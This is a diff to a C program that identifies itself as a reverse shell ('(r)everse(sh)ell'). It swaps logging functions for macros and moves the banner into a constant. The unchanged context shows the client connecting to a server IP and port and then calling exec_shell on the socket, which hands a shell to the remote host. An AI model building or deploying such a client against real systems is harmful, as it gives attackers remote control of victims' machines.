@@ -9,15 +9,7 @@
 #include "common.h"
 
 static void usage(const char *progname) {
-  const char *banner =
-    "          _       \n"
-    " _ __ ___| |__    \n"
-    "| '__/ __| '_ \\  \n"
-    "| |  \\__ \\ | | |\n"
-    "|_|  |___/_| |_|  \n"
-    "(r)everse(sh)ell\n";
-
-  rsh_log("%s\nusage: %s -s <server_ip> -p <server_port>\n", banner, progname);
+  RSH_LOG("%s\nusage: %s -s <server_ip> -p <server_port>\n", BANNER, progname);
 }
 
 static int parse_args(int argc, char *argv[], struct in_addr *addr,
@@ -62,20 +54,20 @@ static int run(struct sockaddr_in *addr) {
   addr->sin_family = AF_INET;
 
   if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
-    rsh_error("fail to create the communication socket!\n");
+    RSH_ERROR("fail to create the communication socket!\n");
     return 1;
   }
 
-  rsh_info("trying to connect to server...\n");
+  RSH_INFO("trying to connect to server...\n");
 
   if (connect(fd, (struct sockaddr *)addr, sizeof(struct sockaddr))) {
-    rsh_error("fail to connect to server!\n");
+    RSH_ERROR("fail to connect to server!\n");
     close(fd);
 
     return 1;
   }
 
-  rsh_info("connection estabilished...\n");
+  RSH_INFO("connection estabilished!\n");
 
   exec_shell(fd);
 
